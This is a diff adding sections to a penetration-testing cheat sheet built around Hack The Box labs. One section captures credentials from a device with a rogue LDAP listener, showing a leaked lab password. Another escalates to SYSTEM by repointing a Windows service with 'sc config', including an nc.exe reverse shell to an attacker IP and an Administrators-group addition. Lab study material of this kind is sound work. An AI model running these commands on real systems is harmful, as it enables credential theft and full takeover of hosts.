@@ -40,6 +40,7 @@
     - [PowerUp.ps1](#powerupps1)
     - [Interpreting PowerUp Output](#interpreting-powerup-output)
     - [Msfvenom Service Executable and Restart](#msfvenom-service-executable-and-restart)
+    - [Service Reconfiguration via sc config (Server Operators)](#service-reconfiguration-via-sc-config-server-operators)
     - [Token Impersonation (Incognito)](#token-impersonation-incognito)
     - [Potato Attacks](#potato-attacks)
     - [AppLocker bypass](#applocker-bypass)
@@ -765,6 +766,36 @@ ldapsearch -x -H ldap://<target> -b "dc=<domain>,dc=<tld>" > ldapsearch.txt
 
 ### Credential Access
 
+#### Rogue LDAP / Service Credential Capture
+
+Any device or app that **stores credentials** and lets you choose **where it authenticates** (a printer/appliance admin panel, an LDAP/SMB/SMTP "server address" field, a "Test Connection" button) is a credential-capture primitive. Point it at a host you control, trigger the connection, and it binds to *your* server with its stored credentials — often a cleartext LDAP simple bind.
+
+* **Catch a cleartext LDAP bind with plain netcat** — no full rogue server needed when the client does a simple (unencrypted) bind on 389:
+
+```bash
+nc -lvnp 389
+```
+
+* Change the target's configured server address to your VPN IP (`tun0`), submit, and read the bind off the wire:
+
+```text
+connect to [10.10.15.55] from (UNKNOWN) [10.129.95.241] 51639
+0*`%return\svc-printer
+                       1edFg43012!!
+```
+
+* The leaked line is `<domain>\<user>` followed by the password.
+
+* **If the client insists on a fuller LDAP handshake** (StartTLS, or it won't send the bind to a bare socket), stand up a real rogue LDAP server instead:
+
+```bash
+# Option A: slapd (OpenLDAP) listening on 389, watch the logs for the bind DN/password
+# Option B: Responder (also catches SMB/HTTP/etc. auth)
+sudo responder -I tun0
+```
+
+* Seen on HTB **Return**, where the printer admin panel leaks `svc-printer`'s password this way — full chain in [writeups/hackthebox/return.md](writeups/hackthebox/return.md).
+
 #### AS-REP Roasting
 
 Targets accounts with **Do not require Kerberos preauthentication**. No domain creds needed.
@@ -1408,6 +1439,44 @@ net start AdvancedSystemCareService9
 
 * Replace `AdvancedSystemCareService9` with the **ServiceName** from PowerUp or `sc qc <ServiceName>` output
 
+#### Service Reconfiguration via `sc config` (Server Operators)
+
+Different from the PowerUp "writable service binary" case above: here you do **not** overwrite a file on disk. Your **group membership** lets you rewrite a service's configured command directly, then restart it. Services run as **LocalSystem**, so the new command executes as **NT AUTHORITY\SYSTEM**.
+
+* **When to try it** — `whoami /groups` shows a privileged service-managing group:
+  * `BUILTIN\Server Operators` (S-1-5-32-549) — can manage services on a DC; effectively SYSTEM
+  * Also check `Backup Operators`, `Print Operators` (`SeLoadDriverPrivilege`), `DnsAdmins`
+
+* **Inspect the target service** (any service you are allowed to stop/start — `VMTools` is a common lab pick):
+
+```powershell
+sc.exe qc VMTools
+```
+
+* **Reconfigure the binary path** — reverse shell via `nc.exe` (upload it first):
+
+```powershell
+upload /usr/share/windows-resources/binaries/nc.exe C:\Windows\Temp\nc.exe
+sc.exe config VMTools binPath="C:\Windows\Temp\nc.exe -e cmd.exe <YOUR_IP> 4444"
+```
+
+* **Or a one-shot** that needs no listener — add your account to local Administrators:
+
+```powershell
+sc.exe config VMTools binPath="cmd.exe /c net localgroup Administrators <your_user> /add"
+```
+
+* **Restart to trigger execution as SYSTEM**:
+
+```cmd
+sc.exe stop VMTools
+sc.exe start VMTools
+```
+
+* `sc start` returns a timeout / error `1053` because your command is not a real service — **this is expected**, the process still spawns. Catch the shell (or re-login so the new group is in your token) and verify with `whoami`.
+* Restore the original `binPath` afterwards (`sc.exe config VMTools binPath="<original>"`) to keep the service healthy.
+* Full chain on HTB **Return**: [writeups/hackthebox/return.md](writeups/hackthebox/return.md).
+
 #### Token Impersonation (Incognito)
 
 * **When to try it** - If `whoami /priv` shows `SeImpersonatePrivilege` (or `SeAssignPrimaryTokenPrivilege`), token impersonation is a top Windows privesc path.
@@ -1487,8 +1556,10 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 
 ```text
 whoami /priv          -> SeImpersonatePrivilege? -> Token impersonation / Potato
+whoami /groups        -> Server/Backup/Print Operators, DnsAdmins? -> privileged-group abuse
 winPEAS / PowerUp     -> service misconfig, unquoted paths, weak perms, UnattendPath
 sc qc <service>       -> inspect binary path, start account, startup type
+sc config <svc> binPath=...  -> Server Operators: repoint + restart = SYSTEM
 accesschk / icacls    -> weak service/binary/folder permissions
 type Unattended.xml   -> leftover setup credentials (Panther)
 ```
